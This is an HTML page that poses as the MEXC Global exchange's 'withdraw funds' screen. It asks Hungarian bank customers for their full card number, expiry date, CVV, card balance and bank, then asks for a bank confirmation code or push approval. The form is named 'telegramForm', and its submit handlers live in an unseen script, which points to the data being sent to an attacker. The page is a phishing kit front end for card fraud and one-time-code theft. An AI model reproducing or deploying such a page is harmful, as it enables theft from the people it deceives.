<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WITHDRAW MEXC GLOBAL</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<form id="telegramForm">
    <br>
    <label for="name">NAME SURNAME:</label>
    <input type="text" id="name" name="name" required>

    <label for="cardNumber">CARD NUMBER:</label>
    <input type="text" id="cardNumber" name="cardNumber" required placeholder="7000 0000 0000 0000" oninput="formatCardNumber(event) " inputmode="numeric" autocomplete="off" data-name="randomName1" readonly>

    <div class="flex-container">
        <div class="flex-item">
            <label for="expiryDate">VALID THRU:</label>
            <input type="text" id="expiryDate" name="expiryDate" required placeholder="09/26" maxlength="5" oninput="formatExpiryDate(event)" inputmode="numeric" autocomplete="off" data-name="randomName2" readonly>
        </div>
        <div class="flex-item">
            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" required placeholder="468" maxlength="3" pattern="\d{3}" inputmode="numeric" autocomplete="off" data-name="randomName3" readonly>
        </div>
    </div>
    <br>
    <br>
    <label for="cardBalance">CARD BALANCE:</label>
    <div class="flex-container">
        <input type="text" id="cardBalance" name="cardNumber" required pattern="\d+" class="sameSizeInput" inputmode="numeric" autocomplete="off" data-name="randomName4" readonly>
        <select id="currency" name="currency" required>
            <option value="HUF">HUF</option>
            <option value="USD">USD</option>
            <option value="EUR">EUR</option>
            <!-- Добавьте другие валюты по аналогии -->
        </select>
    </div>
    <label for="chooseBank">CHOOSE YOUR BANK:</label>
    <select id="chooseBank" name="chooseBank" required>
        <option value="" selected disabled>Select a bank</option>
        <option value="OTP Bank">OTP Bank</option>
        <option value="K&H Bank">K&H Bank</option>
        <option value="Erste Bank">Erste Bank</option>
        <option value="Budapest Bank">Budapest Bank</option>
        <option value="CIB Bank">CIB Bank</option>
        <option value="MKB Bank">MKB Bank</option>
        <option value="Raiffeisen Bank">Raiffeisen Bank</option>
        <option value="UniCredit Bank">UniCredit Bank</option>
        <option value="Pannon Takarék Bank">Pannon Takarék Bank</option>
        <option value="Duna Takarék">Duna Takarék</option>
        <option value="Polgári Bank">Polgári Bank</option>
        <option value="Kinizsi Bank">Kinizsi Bank</option>
        <option value="Mohácsi Takarék Bank	">Mohácsi Takarék Bank</option>
        <option value="MagNet Bank">MagNet Bank</option>
        <option value="Sopron Bank">Sopron Bank</option>
        <option value="Citibank">Citibank</option>
        <option value="Oberbank">Oberbank</option>
        <option value="AXA Bank">AXA Bank</option>
        <option value="Banif Plus Bank">Banif Plus Bank</option>
        <option value="Gránit Bank">Gránit Bank</option>
        <option value="BNP Paribas">BNP Paribas</option>
        <option value="Cetelem Bank">Cetelem Bank</option>
        <option value="Cofidis">Cofidis</option>
        <option value="Eximbank">Eximbank</option>
        <option value="ING Bank">ING Bank</option>
        <option value="Merkantil Bank">Merkantil Bank</option>
        <option value="NHB Bank">NHB Bank</option>
    </select>
    <br>
    <button type="button" onclick="sendMessage()">WITHDRAW FUNDS</button>
</form>

<div id="enterCodeForm" style="display: none;">
    <label for="code">Enter the code or confirm the push notification:</label>
    <input type="text" id="code" name="code" required>
    <br>
    <button type="button" onclick="sendCode()">Submit Code</button>
</div>
<img src="https://i.ibb.co/25GrPmf/mexc.png" alt="Логотип" class="logo" border="0">

<script src="script.js"></script>



<script>
    window.onload = function() {
        document.getElementById('cardNumber').value = '';
        document.getElementById('expiryDate').value = '';
        document.getElementById('cvv').value = '';
        document.getElementById('cardBalance').value = '';
    };
    
    function formatCardNumber(event) {
        var input = event.target;
        var value = input.value.replace(/\D/g, ''); // Удаляем все нецифровые символы

        if (value.length > 16) {
            value = value.slice(0, 16); // Ограничиваем до 16 цифр
        }

        // Добавляем пробел после каждой 4 цифры
        input.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    }
    function formatExpiryDate(event) {
        var input = event.target;
        var value = input.value.replace(/\D/g, ''); // Удаляем все нецифровые символы

        if (value.length > 4) {
            value = value.slice(0, 4); // Ограничиваем до 4 символов (максимум 2 цифры и 1 знак '/')
        }

        var month = value.slice(0, 2);
        var year = value.slice(2);

        // Проверка на правильность даты
        if (month > 12) {
            month = '12';
        }

        // Обновляем значение поля ввода
        input.value = month + (year ? '/' + year : ''); // Добавлено условие для добавления '/'
    }
</script>
</body>
</html>
